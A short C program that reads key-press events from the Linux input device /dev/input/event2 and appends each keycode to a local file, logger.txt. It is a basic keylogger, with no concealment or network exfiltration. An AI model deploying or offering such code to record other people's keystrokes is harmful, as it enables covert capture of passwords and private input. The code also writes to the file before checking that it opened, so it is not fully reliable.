#include <stdio.h>
#include <fcntl.h>
#include <linux/input.h>
#include <unistd.h>
#include <stdlib.h>

int main(){

    int fd;
    struct input_event ev;
    const char *dev = "/dev/input/event2";
    fd = open(dev, O_RDONLY);

    FILE* file;
    file = fopen("./logger.txt", "a");
    fprintf(file, "          \n\n");
    fflush(file);

    if(file == NULL){
        perror("Cannot open logger.txt");
    }

    if(fd == -1){
        perror("Cannot open dev.");
        return 1;
    } 

    printf("Reading events from %s ....", dev);

   
    while(1){
        read(fd, &ev, sizeof(struct input_event));

        if( ev.type == 1 && ev.value == 1 ){
            fprintf(file, "Key pressed: Code %d\n", ev.code);
            fflush(file);
            printf("Key pressed: Code %d\n", ev.code);
        }                
    }
        close(fd);
        return 0;


}
